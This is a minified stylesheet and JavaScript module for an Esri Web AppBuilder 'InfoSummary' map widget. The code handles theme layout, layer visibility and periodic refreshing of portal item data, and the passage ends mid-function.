{background-image: url(../images/_nav_up.png); bottom: -1px; background-position-y: 2px; border-top: 1px solid rgba(0,0,0,.5); border-left: 1px solid rgba(0,0,0,.5); border-right: 1px solid rgba(0,0,0,.5); -webkit-border-top-radius: 8px; -moz-border-top-radius: 8px; -o-border-top-radius: 8px; -ms-border-top-radius: 8px; border-top-left-radius: 8px; border-top-right-radius: 8px; z-index: 1;}.jimu-widget-InfoSummary .expandDown-dart {background-image: url(../images/_nav_down.png); bottom: -5px; background-position-y: -1px; border-bottom: 1px solid rgba(0,0,0,.5); -webkit-border-bottom-radius: 8px; -moz-border-bottom-radius: 8px; -o-border-bottom-radius: 8px; -ms-border-bottom-radius: 8px; border-bottom-left-radius: 8px; border-bottom-right-radius: 8px; z-index: 1;}.jimu-widget-InfoSummary .groupField{text-align: left; display: table-cell; font-size: 14px; width: 100%; padding-left: 5px;}.jimu-rtl .jimu-widget-InfoSummary .groupField{text-align: right; display: table-cell; font-size: 14px; width: 100%; padding-right: 5px;}.jimu-widget-InfoSummary .groupFieldImage{text-align: left; display: table-cell; font-size: 14px; width: 100%; vertical-align: middle; padding-left: 10px;}.jimu-rtl .jimu-widget-InfoSummary .groupFieldImage{text-align: right; display: table-cell; font-size: 14px; width: 100%; vertical-align: middle; padding-right: 10px;}.jimu-widget-InfoSummary .groupItem{display: block; width: 100%; cursor: pointer; border-bottom: 1px solid #dcdcdc; float: left; overflow: hidden; text-align: -webkit-left; text-align: -moz-left; text-align: left;}.jimu-rtl .jimu-widget-InfoSummary .groupItem{display: block; width: 100%; cursor: pointer; border-bottom: 1px solid #dcdcdc; float: right; overflow: hidden; text-align: -webkit-right; text-align: -moz-right; text-align: right;}.jimu-widget-InfoSummary .groupItemTitle:hover .groupItemImageUp{background-image: url(../images/_nav_up.png); background-color: gray;}.jimu-widget-InfoSummary .groupItemTitle:hover .groupItemImageDown{background-image: url(../images/_nav_down.png); background-color: gray;}.jimu-widget-InfoSummary .groupItemTitle{width: 100%; height: 30px; display: table;}.jimu-widget-InfoSummary .groupItemImage{width: 25px; height: 12px; cursor: pointer; background-repeat: no-repeat; background-size: contain; background-position: 50% 50%; cursor: pointer; vertical-align: middle; -webkit-border-radius: 10px; -moz-border-radius: 10px; -o-border-radius: 10px; -ms-border-radius: 10px; border-radius: 10px; border: 2px solid #dcdcdc;}.jimu-widget-InfoSummary .groupItemImageUp{background-image: url(../images/default_nav_up.png); background-color: white;}.jimu-widget-InfoSummary .groupItemImageDown{background-image: url(../images/default_nav_down.png); background-color: white;}.jimu-widget-InfoSummary .groupOff{display: none !important;}.jimu-widget-InfoSummary .groupOn{height: auto; display: block;}.jimu-widget-InfoSummary .clusterSymbol{margin: 4px 4px 4px 4px; display: block; width: 35px; visibility: visible; height: 35px; float: left; -moz-border-radius: 30px; -webkit-border-radius: 30px; border-radius: 30px; opacity:0.60; filter: alpha(opacity\x3d30); z-index: 3;}.jimu-widget-InfoSummary .panelMain {display: block;}.jimu-widget-InfoSummary .panelContent {position: absolute; right: 0px; top: 0px; width: 100%; height: 100%;}.jimu-widget-InfoSummary .page {position: relative; width: 100%; margin-left: 0px; height: 100%; display: block;}.jimu-widget-InfoSummary .pageContent {position:absolute; left: 0px; right: 0px; top: 0px; bottom: 0px; overflow: hidden; display: block;}.jimu-widget-InfoSummary .pageHeader-border {border-bottom: 1px solid lightgray;}.jimu-widget-InfoSummary .pageHeader-border-dart {border-bottom: 1px solid black;}.jimu-widget-InfoSummary .pageHeader {position: relative; width: 100%; height: 160px; text-align: center; display: block;}.jimu-widget-InfoSummary .pageHeaderRefresh {position: relative; width: 100%; height: 180px; text-align: center; display: block;}.jimu-widget-InfoSummary .pageHeaderRefreshNoText {position: relative; width: 100%; height: 160px; text-align: center; display: block;}.jimu-widget-InfoSummary .pageTitle {position: absolute; left: 0px; bottom: 8px; height: auto; font-size: 16px; color: #ffffff; text-align: center; width: 100%;}.jimu-widget-InfoSummary .pageTitleRefresh {position: absolute; left: 0px; bottom: 25px; height: auto; font-size: 16px; color: #ffffff; text-align: center; width: 100%;}.jimu-widget-InfoSummary .pageTitleRefresh-tab {position: absolute; left: 0px; bottom: 25px; height: auto; font-size: 16px; text-align: center; width: 100%;}.jimu-widget-InfoSummary .lastUpdated {position: absolute; left: 0px; bottom: 5px; height: auto; font-size: 12px; color: #ffffff; text-align: center; width: 100%;}.jimu-widget-InfoSummary .lastUpdated-tab {position: absolute; left: 0px; bottom: 5px; height: auto; font-size: 12px; text-align: center; width: 100%;}.jimu-widget-InfoSummary .pageTitleWidth {width: 100%;}.jimu-widget-InfoSummary .pageCounter {position: absolute; top: 10px; width: auto; height: auto; left: 15px; right:15px;}.jimu-widget-InfoSummary .pageBody {position: absolute; top: 160px; bottom: 0px; width: 100%; display: block; color: #000000; font-size: 10px; text-align: center; padding: 0px; overflow-x: hidden; overflow-y: auto;}.jimu-widget-InfoSummary .pageBodyRefresh {position: absolute; top: 180px; bottom: 0px; width: 100%; display: block; color: #000000; font-size: 10px; text-align: center; padding: 0px; overflow-x: hidden; overflow-y: auto;}.jimu-widget-InfoSummary .pageBodyRefreshNoText {position: absolute; top: 160px; bottom: 0px; width: 100%; display: block; color: #000000; font-size: 10px; text-align: center; padding: 0px; overflow-x: hidden; overflow-y: auto;}.jimu-widget-InfoSummary .resultsContent {width: 100%; min-height: 100%; overflow-x: hidden; overflow-y: hidden;}.jimu-widget-InfoSummary .recDefault {cursor: default;}.jimu-widget-InfoSummary .recIcon {position: absolute; left: 10px; top: 10px; width: 50px; height: 50px; border: 3px solid rgba(0,0,0,1); -moz-border-radius: 41px; -webkit-border-radius: 41px; border-radius: 41px; opacity: 0.5; filter: alpha(opacity\x3d50); cursor: pointer;}.jimu-rtl .jimu-widget-InfoSummary .recIcon {position: absolute; right: 10px; top: 10px; width: 50px; height: 50px; border: 3px solid rgba(0,0,0,1); -moz-border-radius: 41px; -webkit-border-radius: 41px; border-radius: 41px; opacity: 0.5; filter: alpha(opacity\x3d50); cursor: pointer;}.jimu-widget-InfoSummary .thumb2{width: 43px; height: 43px; align-content: center; vertical-align: super; z-index: 1;}.jimu-widget-InfoSummary .active {opacity: 0.8; filter: alpha(opacity\x3d80); background-color: rgba(0,0,0,0.25);}.jimu-rtl .jimu-widget-InfoSummary .active {opacity: 0.8; filter: alpha(opacity\x3d80); background-color: rgba(0,0,0,0.25);}.jimu-widget-InfoSummary .groupCountLabel {line-height: 30px; font-size: 16px; font-weight: 300; display: table-cell; width: auto; height: 100%; padding-right: 10px;}.jimu-rtl .jimu-widget-InfoSummary .groupCountLabel {line-height: 30px; font-size: 16px; font-weight: 300; display: table-cell; width: auto; height: 100%; padding-left: 10px;}.jimu-widget-InfoSummary .inActive {opacity: 0.6; filter: alpha(opacity\x3d60);}.jimu-widget-InfoSummary .recLabel {display: table-cell; line-height: 70px; font-size: 16px; font-weight: 500; text-align: center; vertical-align: middle; padding-left: 65px; text-overflow: ellipsis; width: 100%; padding-right: 10px; max-width: 100px; overflow: hidden; word-wrap: break-word;}.jimu-rtl .jimu-widget-InfoSummary .recLabel {display: table-cell; line-height: 70px; font-size: 16px; font-weight: 500; text-align: center; vertical-align: middle; padding-right: 65px; text-overflow: ellipsis; width: 100%; padding-left: 10px; max-width: 200px; overflow: hidden; word-wrap: break-word;}.jimu-widget-InfoSummary .recLabelNoCount {display: table-cell; line-height: 70px; font-size: 16px; font-weight: 500; text-align: center; vertical-align: middle; padding-left: 65px; margin-right: 10px; text-overflow: ellipsis; overflow: hidden; width: auto;}.jimu-rtl .jimu-widget-InfoSummary .recLabelNoCount {display: table-cell; line-height: 70px; font-size: 16px; font-weight: 500; text-align: center; vertical-align: middle; padding-right: 65px; margin-left: 10px; text-overflow: ellipsis; overflow: hidden; width: auto;}.jimu-widget-InfoSummary .recNumInActive {height: 100%; text-align: center; font-size: 28px; margin-right: 10px; float: right; display: none; width: 0px; padding-left: 10px;}.jimu-rtl .jimu-widget-InfoSummary .recNumInActive {height: 100%; text-align: center; font-size: 28px; margin-right: 10px; float: left; display: none; width: 0px; padding-left: 10px;}.jimu-widget-InfoSummary .recNum {height: 100%; text-align: center; font-size: 28px; margin-right: 10px; float: right; display: table-cell; width: auto; padding-left: 10px;}.jimu-rtl .jimu-widget-InfoSummary .recNum {height: 100%; text-align: center; font-size: 28px; margin-left: 10px; float: left; display: table-cell; width: auto; padding-right: 10px;}.jimu-widget-InfoSummary .innerMainPanelIcon {background-size: contain; width: 100%; max-width: 310px; height: 120px; background-repeat: no-repeat; background-position: 50% 50%; display: inline-block;}.jimu-widget-InfoSummary .innerSVGPosition {width: 100%; height: 100%; vertical-align: middle;}.jimu-widget-InfoSummary .innerCirclePosition {position: relative; top: 8px; left: 8px;}.jimu-widget-InfoSummary .pageBodyNoIcon {position: absolute; top: 0px; bottom: 0px; width: 100%; display: block; color: #000000; font-size: 10px; text-align: center; padding: 0px; overflow-x: hidden; overflow-y: auto;}.jimu-widget-InfoSummary .pageHeaderNoIcon {position: relative; width: 100%; height: 0px; text-align: center; display: block;}.jimu-widget-InfoSummary .pageBodyNoIconRefresh {position: absolute; top: 25px; bottom: 0px; width: 100%; display: block; color: #000000; font-size: 10px; text-align: center; padding: 0px; overflow-x: hidden; overflow-y: auto;}.jimu-widget-InfoSummary .pageHeaderNoIconRefresh {position: relative; width: 100%; height: 25px; text-align: center; display: block;}.jimu-widget-InfoSummary .solidBorder {border-bottom: 1px solid #dcdcdc;}.jimu-widget-InfoSummary .solidBorder-dart {border-bottom: 1px solid rgba(0,0,0,.5);}.jimu-widget-InfoSummary .imageDataGFX {display: block; float: left; width: 30px; height: 30px; margin-left: 10px;}.jimu-rtl .jimu-widget-InfoSummary .imageDataGFX {display: block; float: right; width: 30px; height: 30px; margin-right: 10px;}.jimu-widget-InfoSummary .rec {position: relative; width: 100%; height: 70px; display: table; line-height: 70px; cursor: pointer;}.jimu-widget-InfoSummary .rec:hover .expandUp {background-image: url(../images/nav_up.png); background-color: #f2f2f2; -webkit-transform: translateZ(0); -moz-transform: rotate(0);}.jimu-widget-InfoSummary .rec:hover .expandDown {background-image: url(../images/nav_down.png); background-color: #f2f2f2; -webkit-transform: translateZ(0); -moz-transform: rotate(0);}.jimu-widget-InfoSummary .searching{height: 10px; width: 40px; background-image: url(../images/loading.gif); background-repeat: no-repeat; background-size: contain; position: absolute; top: 32px; bottom: 0px; right: 0px;}.jimu-rtl .jimu-widget-InfoSummary .searching{height: 10px; width: 40px; background-image: url(../images/loading.gif); background-repeat: no-repeat; background-size: contain; position: absolute; top: 32px; bottom: 0px; left: 0px;}.jimu-widget-InfoSummary .expandSearching{background-image: url(../images/loading.gif); position: absolute; background-repeat: no-repeat; background-size: contain; bottom: 0px; right: 0px; display: block;}.jimu-rtl .jimu-widget-InfoSummary .expandSearching{background-image: url(../images/loading.gif); position: absolute; background-repeat: no-repeat; background-size: contain; bottom: 0px; left: 0px; display: block;}.jimu-widget-InfoSummary .expand{width: 50px; height: 9px; background-repeat: no-repeat; background-size: contain; background-position: 50% 50%; position: absolute; left: 45%; background-color: white; z-index: 1; -webkit-transform: translateZ(0); -moz-transform: rotate(0);}.jimu-rtl .jimu-widget-InfoSummary .expand{width: 50px; height: 9px; background-repeat: no-repeat; background-size: contain; background-position: 50% 50%; position: absolute; right: 45%; background-color: white; z-index: 1; -webkit-transform: translateZ(0); -moz-transform: rotate(0);}.jimu-widget-InfoSummary .expandInActive{opacity: 0; -webkit-transform: translateZ(0); -moz-transform: rotate(0);}.jimu-widget-InfoSummary .expandImageContainer{width: 25px; height: 12px; margin-right: 5px; display: table-cell; vertical-align: middle; text-align: center; padding-right: 5px;}.jimu-rtl .jimu-widget-InfoSummary .expandImageContainer{width: 25px; height: 12px; margin-left: 5px; display: table-cell; vertical-align: middle; text-align: center; padding-left: 5px;}.jimu-widget-InfoSummary .expandUp{background-image: url(../images/default_nav_up.png); bottom: -1px; background-position-y: 2px; border-top: 1px solid #dcdcdc; border-left: 1px solid #dcdcdc; border-right: 1px solid #dcdcdc; -webkit-border-top-radius:8px; -moz-border-top-radius:8px; -o-border-top-radius:8px; -ms-border-top-radius:8px; border-top-left-radius: 8px; border-top-right-radius: 8px; z-index: 1;}.jimu-widget-InfoSummary .expandDown{background-image: url(../images/default_nav_down.png); bottom: -5px; background-position-y: -1px; border-bottom: 1px solid #dcdcdc; -webkit-border-bottom-radius:8px; -moz-border-bottom-radius:8px; -o-border-bottom-radius:8px; -ms-border-bottom-radius:8px; border-bottom-left-radius: 8px; border-bottom-right-radius: 8px; z-index: 1;}.noselect {-webkit-touch-callout: none; -webkit-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none;}.jimu-widget-InfoSummary .rec-dart {position: relative; width: 100%; height: 70px; display: table; line-height: 70px; color: #6e6e6e; cursor: pointer;}.jimu-widget-InfoSummary .rec-dart:hover .expandUp-dart {background-color: black; -webkit-transform: translateZ(0); -moz-transform: rotate(0);}.jimu-widget-InfoSummary .rec-dart:hover .expandDown-dart {background-color: black; -webkit-transform: translateZ(0); -moz-transform: rotate(0);}.jimu-widget-InfoSummary .layer-row-mouseover {background-color: #f2f2f2;}.jimu-widget-InfoSummary .layer-row-mouseover-dart {background-color: rgba(0,0,0,.5);}@media only screen and (max-width: 750px) {.jimu-widget-InfoSummary .pageContent{} .jimu-widget-InfoSummary .pageHeader{position: relative; width: 100%; height: 0px; text-align: center; display: block;} .jimu-widget-InfoSummary .pageHeaderRefresh {position: relative; width: 100%; height: 45px; text-align: center; display: block;} .jimu-widget-InfoSummary .pageHeaderRefreshNoText {position: relative; width: 100%; height: 25px; text-align: center; display: block;} .jimu-widget-InfoSummary .pageTitle {position: absolute; left: 0px; bottom: 20px; height: auto; font-size: 16px; color: #ffffff; text-align: center; width: 100%;} .jimu-widget-InfoSummary .pageTitleWidth {width: 100%;} .jimu-widget-InfoSummary .pageCounter {display: none; position: absolute; left: 5px; margin-left: 0px; top: 0px; width: 70px; font-size: 40px; height: 70px; line-height: 70px; border: 5px solid rgba(0,0,0,1); -moz-border-radius: 40px; -webkit-border-radius: 40px; border-radius: 40px;} .jimu-widget-InfoSummary .pageBody {position: absolute; top: 0px; bottom: 0px; width: 100%; display: block; color: #000000; font-size: 10px; text-align: center; padding: 0px; overflow-x: hidden; overflow-y: auto;} .jimu-widget-InfoSummary .pageBodyRefresh {position: absolute; top: 45px; bottom: 0px; width: 100%; display: block; color: #000000; font-size: 10px; text-align: center; padding: 0px; overflow-x: hidden; overflow-y: auto;} .jimu-widget-InfoSummary .pageBodyRefreshNoText {position: absolute; top: 25px; bottom: 0px; width: 100%; display: block; color: #000000; font-size: 10px; text-align: center; padding: 0px; overflow-x: hidden; overflow-y: auto;}}",
"*now":function(Q){Q(['dojo/i18n!*preload*widgets/InfoSummary/nls/Widget*["ar","bs","cs","da","de","en","el","es","et","fi","fr","he","hi","hr","id","it","ja","ko","lt","lv","nb","nl","pl","pt-br","pt-pt","ro","ru","sl","sr","sv","th","tr","zh-cn","vi","zh-hk","zh-tw","ROOT"]'])},"*noref":1}});
define("jimu/BaseWidget jimu/LayerInfos/LayerInfos jimu/utils dojo/dom dojo/dom-class dojo/dom-construct dojo/on dojo/dom-style dojo/_base/declare dojo/_base/lang dojo/_base/html dojo/_base/Color dojo/promise/all dojo/_base/array dojo/DeferredList dojo/Deferred dojo/query dojox/gfx/fx dojox/gfx dojo/_base/xhr dijit/_WidgetsInTemplateMixin esri/graphic esri/geometry/Point esri/symbols/SimpleMarkerSymbol esri/symbols/PictureMarkerSymbol esri/symbols/SimpleLineSymbol esri/symbols/SimpleFillSymbol esri/Color esri/tasks/query esri/tasks/QueryTask esri/tasks/FeatureSet esri/arcgis/utils esri/symbols/jsonUtils esri/request esri/renderers/SimpleRenderer esri/renderers/jsonUtils ./js/ClusterLayer esri/layers/LayerDrawingOptions".split(" "),function(Q,
G,w,p,b,l,q,R,S,h,g,z,C,H,v,J,B,x,c,k,Y,u,W,E,T,A,P,X,f,Z,ga,aa,ba,ca,ea,t,fa,da){return S([Q,Y],{baseClass:"jimu-widget-InfoSummary",name:"InfoSummary",opLayerInfos:null,layerList:{},UNIQUE_APPEND_VAL_CL:"_CL",widgetChange:!1,refreshInterval:0,refreshIntervalValue:0,configLayerInfos:[],legendNodes:[],currentQueryList:[],symbols:[],row:null,postCreate:function(){this.inherited(arguments);this.inPanelOverrides(this.appConfig.theme.name);this.configLayerInfos=this.config.layerInfos;this.layerList={};
this._initWidget()},_forceClose:function(){var a=this.appConfig.theme.name,d=this.getPanel();if(-1<"LaunchpadTheme DartTheme FoldableTheme JewelryBoxTheme BillboardTheme TabTheme DashboardTheme".split(" ").indexOf(a))d.containerNode.parentNode.style.display="none",d.containerNode.style.display="none",this.widgetManager.closeWidget(this.id);else if("BoxTheme"===a){if(d.containerNode.parentNode.style.display="none",d.containerNode.style.display="none",d.getParent&&d.getParent()._toggleBox)for(var a=
B(".icon-node-active"),e=0;e<a.length;e++)-1<a[e].outerHTML.indexOf(this.id)&&d.getParent()._toggleBox()}else if("PlateauTheme"===a)if(d.containerNode.parentNode.style.display="none",d.containerNode.style.display="none",this.widgetManager.closeWidget(this.id),this.aw)this.aw._switchNodeToClose(this.id),this.aw._closeDropMenu();else for(d=this.widgetManager.appConfig.widgetOnScreen.widgets,a=0;a<this.widgetManager.appConfig.widgetOnScreen.widgets.length;a++)if(d[a].isThemeWidget){this.aw=this.widgetManager.getWidgetById(d[a].id);
this.aw._switchNodeToClose(this.id);this.aw._closeDropMenu();break}},inPanelOverrides:function(a){"undefined"!==typeof this.iconClickHandler&&(this.iconClickHandler.remove(),this.iconClickHandler=void 0);var d=this.getPanel();if(this.config.hidePanel)if(d=["DartTheme","BoxTheme","FoldableTheme","JewelryBoxTheme","PlateauTheme"],"LaunchpadTheme"===a)this._forceClose(),a=B(".selected"),0<a.length&&-1<a[0].parentNode.outerHTML.indexOf(this.id)&&(this.iconClickHandler=q(a[0],"click",h.hitch(this,this._forceClose)));
else{if(-1<d.indexOf(a))for("BoxTheme"===a&&this._forceClose(),a=B(".icon-node"),d=0;d<a.length;d++)-1<a[d].outerHTML.indexOf(this.id)&&(this.iconClickHandler=q(a[d],"click",h.hitch(this,this._forceClose)))}else switch(d.containerNode&&d.containerNode.firstChild&&d.containerNode.firstChild.className&&(d.containerNode.firstChild.style.padding="0px 0px 10px 0px"),-1===["TabTheme","BillboardTheme","PlateauTheme","DashboardTheme"].indexOf(a)&&this._updateBackgroundColors(!0),this.isDartTheme="DartTheme"===
a,this.isDashboardTheme="DashboardTheme"===a,b.contains(this.pageHeader,this.isDartTheme?"pageHeader-border":"pageHeader-border-dart")&&b.remove(this.pageHeader,this.isDartTheme?"pageHeader-border":"pageHeader-border-dart"),b.add(this.pageHeader,this.isDartTheme?"pageHeader-border-dart":"pageHeader-border"),a){case "DartTheme":this.updateForDartTheme(d);break;case "BoxTheme":this.updateForBoxTheme(d);break;case "TabTheme":this.updateForTabTheme(d);break;case "LaunchpadTheme":this.updateForLaunchpadTheme(d);
break;case "BillboardTheme":this.updateForBillboardTheme(d);break;case "PlateauTheme":this.updateForPlateauTheme(d);break;case "DashboardTheme":this.updateForDashboardTheme(d)}},updateForLaunchpadTheme:function(a){a.containerNode.style.top="30px"},updateForTabTheme:function(a){if(0<a.containerNode.children.length){var d=a.containerNode.children[0];1<d.children.length&&(d.children[1].style.padding="14px 0px 14px 0px")}a.config.isOnScreen||this._updateBackgroundColors(!1)},updateForBoxTheme:function(a){a.containerNode.parentNode.style.top=
"140px"},updateForDartTheme:function(a){a.containerNode.style.right="0px";a.containerNode.style.left="0px"},updateForBillboardTheme:function(){this._updateBackgroundColors(!1)},updateForPlateauTheme:function(){this._updateBackgroundColors(!1)},updateForDashboardTheme:function(){this._updateBackgroundColors(!1)},_updateBackgroundColors:function(a){b.contains(this.lastUpdated,a?"lastUpdated-tab":"lastUpdated")&&b.remove(this.lastUpdated,a?"lastUpdated-tab":"lastUpdated");b.add(this.lastUpdated,a?"lastUpdated":
"lastUpdated-tab");a=a&&"DashboardTheme"!==this.appConfig.theme.name;this.useDarkText=!a;b.contains(this.pageHeader,"jimu-main-background")&&!a?b.remove(this.pageHeader,"jimu-main-background"):!b.contains(this.pageHeader,"jimu-main-background")&&a&&b.add(this.pageHeader,"jimu-main-background");b.contains(this.pageHeader,"dart-bgcolor")&&!a?b.remove(this.pageHeader,"dart-bgcolor"):!b.contains(this.pageHeader,"dart-bgcolor")&&a&&b.add(this.pageHeader,"dart-bgcolor");b.contains(this.pageHeader,"box-bgcolor")&&
!a?b.remove(this.pageHeader,"box-bgcolor"):!b.contains(this.pageHeader,"box-bgcolor")&&a&&b.add(this.pageHeader,"box-bgcolor")},startup:function(){this.inherited(arguments);this.hidePanel||this.showAllFeatures?this.showAllFeatures&&this._mapExtentChange():(this.mapExtentChangedHandler=this.map.on("extent-change",h.hitch(this,this._mapExtentChange)),this._mapExtentChange())},onOpen:function(){this.widgetChange=!1;this.hidePanel?"BoxTheme"!==this.appConfig.theme.name&&this._forceClose():this._updatePanelHeader();
this.appConfig.theme.styles&&this.appConfig.theme.styles[0]&&this._updateStyleColor(this.appConfig.theme.styles[0]);var a=[],d;for(d in this.layerList){var e=this.layerList[d],b=e.li,c=e.layerObject;if(b&&b.orgRenderer){if(c.setRenderer)c.setRenderer(b.newRenderer);else if(c.setLayerDrawingOptions){var n=[],g=new da;g.renderer=b.newRenderer;n[b.subLayerId]=g;c.setLayerDrawingOptions(n)}else console.log("Error setting the new renderer...will use the default rendering of the layer");"function"===typeof c.refresh&&
c.refresh()}var m;c&&c.layerInfos?m=c:b&&"undefined"!==typeof b.parentLayerID&&(m=this.map.getLayer(b.parentLayerID));if(m&&m.visibleLayers){c=!1;n=0;a:for(;n<a.length;n++)if(a[n].id===m.id){c=!0;break a}0!==a.length&&c||a.push({id:m.id,layers:m.visibleLayers});c=0;c;a:for(;c<a.length;c++)if(a[c].id===m.id)break a;n=a[c].layers;if(m.layerInfos){if(0<m.layerInfos.length&&b&&"undefined"!==typeof b.subLayerId){var g=-1<n.indexOf(b.subLayerId),f=e.parentLayerVisible,k=e.layerObject.parentLayerVisible;
"ClusterLayer"===e.type&&(g||f||k)?(e.parentLayerVisible=!0,e.layerObject.parentLayerVisible=!0,e.visible=!0,g&&n.splice(n.indexOf(b.subLayerId),1)):g||f?(e.parentLayerVisible=!0,e.visible=!0,-1===n.indexOf(b.subLayerId)&&n.push(b.subLayerId)):(e.parentLayerVisible=!1,e.visible=!1,g&&n.splice(n.indexOf(b.subLayerId),1),"ClusterLayer"===e.type&&(e.layerObject.parentLayerVisible=!1,-1<this.map.graphicsLayerIds.indexOf(e.id)&&(b=this.map.getLayer(e.id),b.setVisibility(!1))))}a[c].layers=n}this.updatePanelVisibility(e,
d,e)}else c&&("ClusterLayer"===e.type&&c._parentLayer&&(-1<this.map.graphicsLayerIds.indexOf(e.id)&&(b=this.map.getLayer(e.id),"undefined"===typeof e.layerObject.parentLayerVisible&&(e.parentLayerVisible=c._parentLayer.visible,e.layerObject.parentLayerVisible=c._parentLayer.visible),b.setVisibility(e.layerObject.parentLayerVisible)),c._parentLayer.setVisibility&&c._parentLayer.setVisibility(!1)),this.updatePanelVisibility(c,d,e));this.showAllFeatures&&this.config.expandList&&e.legendOpen&&!e.isLoaded&&
(b=this._inVisibleRange(e,d),e.visible&&b&&(e.updateList=!0))}for(d=0;d<a.length;d++)(e=this.map.getLayer(a[d].id))&&e.setVisibleLayers(a[d].layers);this.hidePanel||this.showAllFeatures||"undefined"!==typeof this.mapExtentChangedHandler||(this.mapExtentChangedHandler=this.map.on("extent-change",h.hitch(this,this._mapExtentChange)),this._mapExtentChange());this.config.refreshEnabled&&this.enableRefresh();this.map.infoWindow&&(this.map.infoWindow.highlight=!0)},updatePanelVisibility:function(a,d,e){if(!this.hidePanel&&
"undefined"!==typeof a.visible){var r=this._inVisibleRange(e,d),c=p.byId("recLabel_"+d);a.visible?(b.contains("recIcon_"+d,"active")||b.add("recIcon_"+d,"active"),this.config.countEnabled&&b.contains("recNum_"+d,"recNumInActive")&&(b.remove("recNum_"+d,"recNumInActive"),b.add("recNum_"+d,"recNum")),c&&c.firstChild&&b.remove(c.firstChild,"inActive"),e.listDisabled||("undefined"===typeof r||r)&&b.contains("exp_"+d,"expandInActive")&&b.remove("exp_"+d,"expandInActive"),b.contains("rec_"+d,"recDefault")&&
b.remove("rec_"+d,"recDefault")):(b.contains("recIcon_"+d,"active")&&b.remove("recIcon_"+d,"active"),this.config.countEnabled&&b.contains("recNum_"+d,"recNum")&&(b.remove("recNum_"+d,"recNum"),b.add("recNum_"+d,"recNumInActive")),c&&c.firstChild&&b.add(c.firstChild,"inActive"),e.listDisabled||(b.contains("exp_"+d,"expandInActive")||b.add("exp_"+d,"expandInActive"),e.toggleLegend.remove()),b.contains("rec_"+d,"rec")&&b.add("rec_"+d,"recDefault"))}},enableRefresh:function(){var a=null,d=!1,e;for(e in this.layerList){a=
this.layerList[e];if("ClusterLayer"!==a.type)!d&&a.li&&a.li.itemId&&(this.getItem(a.li.itemId),d=!0),a=a.layerObject;else for(var b=0;b<this.layerInfos.length;b++){var c=this.layerInfos[b];if(c.layerObject){a=c.layerObject;break}}a&&(a.refreshInterval=this.config.refreshInterval)}a=6E4*this.config.refreshInterval;0===this.refreshInterval&&0===this.refreshIntervalValue?(this.refreshIntervalValue=a,this.refreshInterval=setInterval(h.hitch(this,this.refreshLayers),this.refreshIntervalValue)):0!==this.refreshIntervalValue&&
this.refreshIntervalValue!==a&&(this.refreshIntervalValue=a,clearInterval(this.refreshInterval),this.refreshInterval=0,this.refreshInterval=setInterval(h.hitch(this,this.refreshLayers),this.refreshIntervalValue))},getItem:function(a){var d=("/"!==window.portalUrl.substr(-1)?window.portalUrl+="/":window.portalUrl)+"sharing/rest/content/items/"+a;ca({url:d,content:{f:"json",requestTime:Date.now()}}).then(h.hitch(this,function(e){if(e){e=e.modified;var b=!0;this.lastModifiedTime&&(b=this.lastModifiedTime<
e);-1<this.currentQueryList.indexOf(a)&&this.currentQueryList.splice(this.currentQueryList.indexOf(a),1);b&&(this.lastModifiedTime=e,this._updatePanelTime(e),ca({url:d+"/data",content:{f:"json",requestTime:Date.now()}}).then(h.hitch(this,this._updateItem,a)))}}))},_updatePanelTime:function(a){this.hidePanel||(this.lastUpdated.innerHTML="\x3cdiv\x3e\x3c/div\x3e",this.lastUpdated.innerHTML=w.fieldFormatter.getFormattedDate(new Date(a),{dateFormat:"shortDateShortTime"}))},refreshLayers:function(){for(var a in this.layerList){var d=
this.layerList[a],e;d.li&&d.li.itemId?e=d.li.itemId:d.layerObject.itemId&&(e=d.layerObject.itemId);e&&-1===this.currentQueryList.indexOf(e)&&(this.currentQueryList.push(e),this.getItem(e))}},_updateItem:function(a,d){for(var e=0;e<d.layers.length;e++)this._updateLayerItem(d.layers[e],this.lastModifiedTime);this.currentQueryList.splice(this.currentQueryList.indexOf(a),1)},_updateLayerItem:function(a){var d,e,b,c,n;for(n in this.layerList){var g=this.layerList[n];if(g.pl&&g.pl.layerDefinition){if(g.pl.layerDefinition.name===
a.layerDefinition.name){d=g;e=g.pl;break}}else if(g.layerObject._parentLayer)g.layerObject._parentLayer.name===a.layerDefinition.name&&(b="undefined"!==typeof g.listDisabled?g.listDisabled:!1,c=g.li.symbolData.featureDisplayOptions.fields&&0<g.li.symbolData.featureDisplayOptions.fields.length,!b&&c&&(g.isLoaded=!1),g.layerObject.refreshFeatures(a),g.layerObject&&this._loadList(g,!0));else if(g.pl&&g.pl.name&&g.pl.name===a.layerDefinition.name){d=g;e=g.pl;break}}if(a&&d&&e&&(e.featureSet||e.graphics)){a=
a.featureSet.features;var m;if(e.featureSet)m=e.featureSet.features;else{m=[];var f=this._getSpatialReference(a),k=this._getSpatialReference(e.graphics);H.forEach(e.graphics,function(a){var d=a.geometry,d=d.rings?{rings:d.rings}:d.paths?{paths:d.paths}:d.points?{points:d.points}:d.x&&d.y?{x:d.x,y:d.y}:{};d!=={}&&m.push({attributes:a.attributes,geometry:h.mixin({spatialReference:f&&k&&f.wkid===k.wkid?f:k},d)})})}b=!0;1E4>a.length&&(b=JSON.stringify(m)!==JSON.stringify(a));if(b){b="undefined"!==typeof d.listDisabled?
d.listDisabled:!1;c=d.li.symbolData.featureDisplayOptions.fields&&0<d.li.symbolData.featureDisplayOptions.fields.length;!b&&c&&(d.isLoaded=!1,d.requiresReload=!0);b&&(d.li.layerListExtentChanged=!0);d.layerObject.clear();b=d.layerObject.spatialReference;for(c=0;c<a.length;c++)if(n=a[c],n.geometry){var g=this.getGraphicOptions(n,b,d.layerObject.renderer),l=new u(g);l.setSymbol(g.symbol);l.setAttributes(n.attributes);this._infoTemplate&&l.setInfoTemplate(this._infoTemplate);d.layerObject.add(l)}else console.log("Null geometry skipped");
d.layerObject.refresh();e.featureSet&&(e.featureSet.features=a);this.countFeatures(d);d.layerObject&&d.layerObject.visible&&this._loadList(d,!0)}}},_getSpatialReference:function(a){var d;a&&a.hasOwnProperty("length")&&0<a.length&&(a=a[0],a.geometry&&a.geometry.spatialReference&&(d=a.geometry.spatialReference));return d},getGraphicOptions:function(a,d,e){return"undefined"!==typeof a.geometry.rings?{geometry:{rings:a.geometry.rings,spatialReference:{wkid:d.wkid}}}:"undefined"!==typeof a.geometry.paths?
